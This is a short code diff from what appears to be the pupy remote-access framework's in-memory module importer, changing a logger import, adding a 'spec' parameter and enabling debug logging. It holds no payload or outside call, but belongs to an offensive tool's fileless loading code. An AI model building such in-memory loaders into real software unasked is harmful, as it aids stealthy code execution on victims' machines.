@@ -15,13 +15,15 @@ elif sys.platform == 'win32':
 else:
     from .posix import load_content
 
-from pupy import get_logger
+from pupy.agent import get_logger
 
 
 logger = get_logger('pymemimporter')
 
 
-def import_module(data, initname, fullname, path):
+def import_module(data, initname, fullname, path, spec):
+    import logging
+    logger.setLevel(logging.DEBUG)
     logger.debug('Import module %s', fullname)
     try:
         return load_content(data, path, False, initname)
